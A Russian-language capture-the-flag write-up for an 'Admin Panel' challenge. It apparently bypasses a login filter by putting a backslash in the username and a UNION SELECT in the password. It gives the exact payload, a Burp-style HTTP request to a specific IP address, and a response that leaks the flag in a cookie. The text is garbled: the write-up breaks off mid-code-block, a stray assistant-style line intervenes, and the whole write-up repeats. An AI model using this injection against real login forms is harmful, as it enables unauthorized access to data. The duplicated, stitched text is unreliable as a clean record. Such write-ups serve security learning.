# Writeup: Admin Panel (100 Points)

## Обзор задачи
Цель — обойти форму авторизации на веб-сервере и получить флаг. Стандартные SQL-инъекции блокируются фильтром, возвращающим ответ `Not injectable`.

**URL:** `http://149.102.136.203:3000/`

---

## Уязвимость
Приложение уязвимо к **SQL Injection** через обход фильтрации кавычек с помощью обратного слэша (`\`).

При подстановке `\` в поле `username`, серверный SQL-запрос интерпретирует закрывающую одинарную кавычку как часть строки, что позволяет «вырваться» из синтаксиса через поле `password`.

Примерный вид запроса на сервере:
`SELECT * FROM users WHERE username='\' AND password=' union select ... #'`

---

## Эксплуатация

Для получения данных из таблицы `flag` использован `UNION SELECT`.

### Payload
* **username:** `%5c` (URL-encoded `\`)
* **password:** `union select 1,2 from flag#`

### HTTP Request (Burp Suite)
```http
POST /login HTTP/1.1
Host: 149.102.136.203:3000

username=%5c&password=union+select+1,2+from+flag#
Вот содержимое для файла README.md или writeup.md. Коротко, по делу и без лишних разделов.

Markdown

# Writeup: Admin Panel (100 Points)

## Обзор задачи
Цель — обойти форму авторизации на веб-сервере и получить флаг. Стандартные SQL-инъекции блокируются фильтром, возвращающим ответ `Not injectable`.

**URL:** `http://149.102.136.203:3000/`

---

## Уязвимость
Приложение уязвимо к **SQL Injection** через обход фильтрации кавычек с помощью обратного слэша (`\`).

При подстановке `\` в поле `username`, серверный SQL-запрос интерпретирует закрывающую одинарную кавычку как часть строки, что позволяет «вырваться» из синтаксиса через поле `password`.

Примерный вид запроса на сервере:
`SELECT * FROM users WHERE username='\' AND password=' union select ... #'`

---

## Эксплуатация

Для получения данных из таблицы `flag` использован `UNION SELECT`.

### Payload
* **username:** `%5c` (URL-encoded `\`)
* **password:** `union select 1,2 from flag#`

### HTTP Request (Burp Suite)
```http
POST /login HTTP/1.1
Host: 149.102.136.203:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

username=%5c&password=union+select+1,2+from+flag#
Результат
Сервер возвращает 302 Found. Флаг передается в заголовке Set-Cookie.

Response Headers:

HTTP

HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.5 Python/3.12.5
Set-Cookie: username=KCTF{0c259a70a089442a7e622d02bb5d911f}; Path=/
Location: /
Flag: KCTF{0c259a70a089442a7e622d02bb5d911f}